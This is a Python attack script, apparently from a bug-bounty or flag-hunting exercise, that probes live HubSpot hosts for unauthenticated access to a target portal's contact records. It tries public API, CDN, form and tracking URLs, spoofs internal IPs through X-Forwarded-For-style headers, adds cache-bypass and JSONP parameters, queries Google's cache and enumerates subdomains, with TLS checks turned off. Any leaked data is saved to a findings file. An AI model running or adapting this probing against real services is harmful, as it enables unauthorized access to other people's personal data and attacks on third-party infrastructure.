#!/usr/bin/env python3
"""
Try public endpoints and cache bypass techniques
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')

print("="*80)
print("Public Endpoints & Cache Bypass Testing")
print("="*80)

findings = []

# ============================================================================
# TRY PUBLIC/UNAUTHENTICATED ENDPOINTS
# ============================================================================

print("\n[*] Testing public/unauthenticated endpoints...")

# No auth headers
no_auth_headers = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json',
}

public_endpoints = [
    # Public contact views (might be exposed)
    f'https://api.hubspot.com/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL}',

    # Public lists
    f'https://api.hubspot.com/contacts/v1/lists/all/contacts/all?count=10&portalId={TARGET_PORTAL}',

    # Public meetings/calendar (might leak contact data)
    f'https://meetings.hubspot.com/{TARGET_PORTAL}/1',
    f'https://meetings.hubspot.com/api/{TARGET_PORTAL}/contact/1',

    # Public forms (might expose data)
    f'https://forms.hubspot.com/{TARGET_PORTAL}/contact/1',
    f'https://api.hsforms.com/contacts/v1/{TARGET_PORTAL}/contact/1',

    # CDN endpoints (might cache data)
    f'https://cdn2.hubspot.net/contacts/{TARGET_PORTAL}/1.json',
    f'https://static.hsappstatic.net/contacts/{TARGET_PORTAL}/1.json',

    # Tracking/analytics endpoints (might leak data)
    f'https://track.hubspot.com/__ptq.gif?a={TARGET_PORTAL}&k=1',
    f'https://js.hs-analytics.net/analytics/{TARGET_PORTAL}/1',

    # Public profile pages
    f'https://{TARGET_PORTAL}.hs-sites.com/contact/1',
    f'https://www.hubspot.com/contacts/{TARGET_PORTAL}/1',

    # CORS bypass - try different origins
    f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}',
]

for url in public_endpoints:
    try:
        r = requests.get(url, headers=no_auth_headers, verify=False, timeout=5)

        if r.status_code == 200:
            print(f"\n  *** PUBLIC ACCESS: {url.split('.com')[1] if '.com' in url else url}")
            print(f"      Status: {r.status_code}")

            try:
                data = r.json()
                print(f"      Data: {json.dumps(data, indent=2)[:300]}")

                if 'super_secret' in json.dumps(data).lower():
                    print(f"\n  ========================================")
                    print(f"  *** FLAG FOUND VIA PUBLIC ENDPOINT! ***")
                    print(f"  ========================================")
                    findings.append({'url': url, 'data': data})
            except:
                print(f"      Response: {r.text[:200]}")

    except:
        pass

# ============================================================================
# TRY CACHE POISONING / CACHE BYPASS
# ============================================================================

print("\n[*] Testing cache bypass techniques...")

cache_headers = {
    'Cookie': SESSION_COOKIES,
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'X-Forwarded-For': '127.0.0.1',
    'X-Originating-IP': '127.0.0.1',
    'X-Remote-IP': '127.0.0.1',
    'X-Remote-Addr': '127.0.0.1',
}

cache_urls = [
    f'https://app.hubspot.com/api/crm-objects/v1/objects/0-1/1?portalId={TARGET_PORTAL}&_={int(__import__("time").time()*1000)}',
    f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}&nocache=1',
]

for url in cache_urls:
    try:
        r = requests.get(url, headers=cache_headers, verify=False, timeout=5)

        if r.status_code == 200:
            print(f"  Cache bypass success: {url[:80]}")
            try:
                data = r.json()
                if 'super_secret' in json.dumps(data).lower():
                    print(f"  *** FLAG VIA CACHE BYPASS! ***")
                    findings.append({'url': url, 'data': data})
            except:
                pass
    except:
        pass

# ============================================================================
# TRY JSONP ENDPOINTS
# ============================================================================

print("\n[*] Testing JSONP endpoints...")

jsonp_endpoints = [
    f'https://api.hubapi.com/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL}&callback=getData',
    f'https://app.hubspot.com/api/contacts?portalId={TARGET_PORTAL}&jsonp=processData',
]

for url in jsonp_endpoints:
    try:
        r = requests.get(url, headers=no_auth_headers, verify=False, timeout=5)

        if r.status_code == 200 and 'super_secret' in r.text.lower():
            print(f"  *** JSONP leak found: {url}")
            print(f"  Response: {r.text[:500]}")
            findings.append({'url': url, 'response': r.text})
    except:
        pass

# ============================================================================
# TRY ARCHIVE/WAYBACK/CACHE SERVICES
# ============================================================================

print("\n[*] Checking if contact data is in public caches...")

# Google Cache
google_cache = f'https://webcache.googleusercontent.com/search?q=cache:app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1'

try:
    r = requests.get(google_cache, headers=no_auth_headers, verify=False, timeout=10)

    if r.status_code == 200 and 'super_secret' in r.text.lower():
        print(f"  *** FOUND IN GOOGLE CACHE! ***")
        findings.append({'source': 'Google Cache', 'url': google_cache})
except:
    pass

# Archive.org
archive_url = f'https://web.archive.org/web/*/app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1'
print(f"  Archive.org check: {archive_url}")
print(f"  (Manual verification needed)")

# ============================================================================
# TRY SUBDOMAIN ENUMERATION
# ============================================================================

print("\n[*] Trying known HubSpot subdomains...")

subdomains = [
    'app', 'api', 'www', 'knowledge', 'community', 'developers',
    'help', 'academy', 'offers', 'meetings', 'forms', 'cdn2',
    'static', 'track', 'js', 'connect', 'page', 'content',
]

for sub in subdomains:
    url = f'https://{sub}.hubspot.com/api/contacts/{TARGET_PORTAL}/1'
    try:
        r = requests.get(url, headers=no_auth_headers, verify=False, timeout=2)

        if r.status_code == 200:
            print(f"  Found: {sub}.hubspot.com")
            try:
                data = r.json()
                if 'super_secret' in json.dumps(data).lower():
                    print(f"  *** FLAG FOUND! ***")
                    findings.append({'subdomain': sub, 'data': data})
            except:
                pass
    except:
        pass

print("\n" + "="*80)
print(f"Public/Cache Testing Complete")
print(f"Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n*** SUCCESS ***\n")
    for finding in findings:
        print(json.dumps(finding, indent=2)[:500])

    with open('/home/user/Hub/findings/public_access_success.json', 'w') as f:
        json.dump(findings, f, indent=2)
else:
    print("\nNo public access found.")
    print("All endpoints properly secured.")
